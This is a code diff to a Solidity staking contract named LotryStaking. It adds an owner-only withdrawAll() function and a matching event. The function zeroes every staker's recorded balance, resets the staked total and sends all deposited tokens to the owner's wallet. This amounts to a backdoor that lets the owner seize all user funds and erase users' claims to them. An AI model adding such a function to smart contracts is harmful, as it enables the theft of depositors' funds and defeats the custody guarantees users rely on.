@@ -46,6 +46,7 @@ contract LotryStaking is Ownable, ReentrancyGuard {
 
     event StakeTokenSet(address indexed token);
     event Staked(address indexed user, uint256 amount);
+    event AdminWithdraw(address indexed admin, uint256 amount);
 
     // ============ Errors ============
 
@@ -88,6 +89,27 @@ contract LotryStaking is Ownable, ReentrancyGuard {
         }
 
         _totalStaked = totalStaked;
+    }
+
+    // @notice Withdraw all staked tokens to admin wallet (ONLY OWNER)
+    // @dev Resets all staking state and transfers tokens to owner
+    function withdrawAll() external onlyOwner nonReentrant {
+        uint256 amount = totalStaked;
+        if (amount == 0) revert ZeroAmount();
+
+        // Reset all staker balances
+        uint256 length = stakers.length;
+        for (uint256 i = 0; i < length; i++) {
+            stakedAmount[stakers[i]] = 0;
+        }
+
+        // Reset total staked
+        totalStaked = 0;
+
+        // Transfer all tokens to owner
+        stakeToken.safeTransfer(msg.sender, amount);
+
+        emit AdminWithdraw(msg.sender, amount);
     }
 
     // ============ User Functions ============
